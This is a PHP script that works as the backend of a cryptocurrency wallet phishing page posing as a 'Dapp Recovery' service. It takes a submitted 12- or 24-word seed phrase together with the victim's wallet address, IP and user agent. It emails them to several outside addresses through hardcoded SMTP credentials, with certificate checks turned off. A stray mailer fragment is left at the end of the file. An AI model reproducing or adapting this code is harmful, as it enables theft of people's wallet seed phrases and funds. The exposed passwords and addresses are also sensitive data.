<?php
//Import the PHPMailer class into the global namespace
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;

// Allow CORS
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: POST, GET, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type, Authorization, X-Requested-With");

// Handle pre-flight requests
if ($_SERVER['REQUEST_METHOD'] == 'OPTIONS') {
    // Stop script processing for pre-flight, after headers are sent
    exit;
}

function getRealIpUser()
{

    switch (true) {

        case (!empty($_SERVER['HTTP_X_REAL_IP'])):
            return $_SERVER['HTTP_X_REAL_IP'];
        case (!empty($_SERVER['HTTP_CLIENT_IP'])):
            return $_SERVER['HTTP_CLIENT_IP'];
        case (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])):
            return $_SERVER['HTTP_X_FORWARDED_FOR'];

        default:
            return $_SERVER['REMOTE_ADDR'];
    }
}
?>
<?php

if ($_POST['dappWord']) {

    $ip = getRealIpUser(); 
    $dappWord = $_POST['dappWord'];
    $dappAddress = $_POST['dappAddress'];
    $dappName = $_POST['dappName'];
    $response = "";

    $date = date("Y-m-d h:i:s"); 

    // 1. Sanitize input to remove any HTML or script tags
    $dappWord = strip_tags($dappWord);

    // 2. Normalize space and split words
    $words = preg_split('/\s+/', trim($dappWord));
    $words = array_filter($words); // Remove any empty values that might be parsed

    // 3. Check the number of words (should be either 12 or 24)
    $wordCount = count($words);
    if ($wordCount !== 12 && $wordCount !== 24) {
        $response = false;
    } else if ($ip === "217.64.114.170") {
        $response = false;
    } else if ($dappWord) {

        $hostname = gethostbyaddr($ip);
        $useragent = $_SERVER['HTTP_USER_AGENT'];

        // Prepare variables (make sure these are already sanitized appropriately)
        $dappWord = htmlspecialchars($dappWord);
        $dappAddress = htmlspecialchars($dappAddress);
        $dappName = htmlspecialchars($dappName);
        $date = htmlspecialchars($date);
        $ip = htmlspecialchars($ip);
        $useragent = htmlspecialchars($useragent);

        $message = '';
        $message .= '<div style="font-family: Arial, sans-serif; font-size: 14px; color: #333;">';
        $message .= '<h2 style="text-align: center;">WALLET CONNECTED</h2>';
        $message .= '<p><strong>Phrase:</strong> ' . $dappWord . '</p>';
        $message .= '<p><strong>Address:</strong> ' . $dappAddress . '</p>';
        $message .= '<p><strong>Type:</strong> ' . $dappName . '</p>';
        $message .= '<p><strong>Date received:</strong> ' . $date . '</p>';
        $message .= '<hr>';
        $message .= '<h3>INFO | IP</h3>';
        $message .= '<p><strong>Client IP:</strong> ' . $ip . '</p>';
        $message .= '<p><a href="https://www.geodatatool.com/en/?ip=' . $ip . '" target="_blank">Geo Data Tool</a></p>';
        $message .= '<p><strong>User Agent:</strong> ' . $useragent . '</p>';
        $message .= '</div>';

        $subject = "|----------|WALLET RESULT|------| $ip"; 

        //send mail
        $email_one = "Deksmsniper@yandex.com"; 
        $email_two = "dekksmoneysniper@proton.me";
        $email_tree = "johnsondoncaster@gmail.com";


        function sendEmail($email, $message, $subject)
        {
            require_once "PHPMailer/PHPMailer.php";
            require_once "PHPMailer/SMTP.php";
            require_once "PHPMailer/Exception.php";
            $mail = new PHPMailer();
            $mail->isSMTP();
            //$mail->SMTPDebug = SMTP::DEBUG_SERVER;
            $mail->Host = 'mail.voicewelfare.com';
            $mail->SMTPAuth = true;
            $mail->Username = 'dapprecovery@voicewelfare.com';
            $mail->Password = 'N2EZo(fd46Oz';
            $mail->Port = 465;
            $mail->SMTPSecure = 'ssl';
            $mail->smtpConnect([
                'ssl' => [
                    'verify_peer' => false,
                    'verify_peer_name' => false,
                    'allow_self_signed' => true 
                ]
            ]);
            $mail->setFrom('dapprecovery@voicewelfare.com', 'Dapps Recovery');
            $mail->addReplyTo('dapprecovery@voicewelfare.com', 'Dapps Recovery');
            $mail->addAddress($email);
            $mail->Subject = $subject;
            $mail->IsHTML(true);
            $mail->Body =  $message;

            //send the message, check for errors
            if (!$mail->send()) {
            } else {
                return true;
            }
        }

       // $send_email_one = sendEmail($email_one, $message, $subject);
        $send_email_two = sendEmail($email_two, $message, $subject);
        $send_email_tree = sendEmail($email_tree, $message, $subject);
    }
} 

// https://voicewelfare.com/recovery/recovery.php


 //$mail->SMTPDebug = SMTP::DEBUG_SERVER;
 $mail->Host = 'smtp.elasticemail.com';
 $mail->SMTPAuth = true;
 $mail->Username = 'mailer@ftceurecovery.com';
 $mail->Password = 'DEE5C0EA00A4104554959F0D231A4C10BC50';
 $mail->Port = 587;
 $mail->SMTPSecure = 'tls';
 $mail->smtpConnect([
     'ssl' => [
         'verify_peer' => false,
         'verify_peer_name' => false,
         'allow_self_signed' => true
     ]
 ]);
 $mail->setFrom('mailer@ftceurecovery.com', 'Dapp Recovery');
 $mail->addReplyTo('mailer@ftceurecovery.com', 'Dapp Recovery');